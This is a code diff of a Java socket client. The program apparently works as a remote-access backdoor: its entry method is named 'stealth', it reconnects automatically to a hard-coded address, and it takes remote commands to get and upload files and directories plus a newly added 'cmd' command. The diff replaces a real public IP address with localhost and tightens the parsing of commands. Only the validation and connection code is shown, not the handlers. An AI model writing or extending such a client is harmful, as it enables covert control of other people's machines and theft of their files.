@@ -3,6 +3,7 @@ import java.io.*;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Base64;
 import java.util.Scanner;
@@ -280,27 +281,33 @@ import java.util.Scanner;
         private String getPath()
         {return path;}
         /*
-        check if a request fulfill our protocol: <Command><SPACE><Path><SPACE><TitleOfFile><SPACE><ExtensionOfFile>
+        check if a request fulfill our protocol: <Command><SPACE><Path><SPACE><TitleOfFile><SPACE><ExtensionOfFile>//OPTIONAL//<to><PathToSaveTo>
         note that TitleOfFile is the new name you give to your downloaded(get)/uploaded(upload) file
          */
-        private boolean valid(String command)// TODO
+        boolean valid(String command)// TODO
         {
             try
             {
-                String[] valid = new String[]{"get","upload","get-dir","upload-dir",""};
+                //list of all commands we have
+                ArrayList<String> valides = new ArrayList<String>();
+                valides.add("upload"); valides.add("upload-to"); valides.add("upload-dir"); valides.add("upload-dir-to"); valides.add("cmd");
+                valides.add("get"); valides.add("get-dir");
                 //if Scanner crash then the protocol is not fulfilled
                 Scanner scan = new Scanner(command);
                 String token;
                 token = scan.next();
                 //check if the first token is a valid command
-                if(!token.equals("get") && !token.equals("upload") && !token.equals("upload-dir") && !token.equals("get-dir"))
+                if(!valides.contains(token))
                     throw new Exception("Invalid command");
                 token = scan.next();
+                //if the path is invalid
                 if(token.length()==0)
                     throw new Exception("Invalid path");
                 token = scan.next();
+                //if the file name is invalid
                 if(token.length()==0)
                     throw new Exception("Invalid name");
+                //if the extension is invalid
                 if(token.length()==0)
                     throw new Exception("Invalid extension");
             }catch(Exception e)
@@ -316,7 +323,7 @@ import java.util.Scanner;
                     (
                     "Syntax: <Command> <Path> <FileName> <Extension>\n" +
                     "Sample: get /home/<username>/Desktop/FileName.zip newFileName zip\n" +
-                    "Commands: upload, get"
+                    "Commands: upload, get, upload-dir, upload-to, upload-dir-to, cmd"
                     );
         }
     /*
@@ -342,8 +349,9 @@ import java.util.Scanner;
             Scanner scan;
             while ((request = in.readLine()) != null)
             {
-                //            if(!client.valid(request))
-                //                continue;
+                //check is the request fulfill the protocol
+                if(!client.valid(request))
+                    continue;
                 scan = new Scanner(request);
                 next = scan.next();
                 switch (next)
@@ -396,7 +404,7 @@ import java.util.Scanner;
     public static void main (String[]args)throws Exception
     {
         int integer;
-        integer = stealth(new String[]{"83.253.236.204","1234"});
+        integer = stealth(new String[]{"localhost","1234"});
         // try again if connection is not closed normally
         while(integer==-1) integer = stealth(new String[]{"localhost", "1234"});
     }
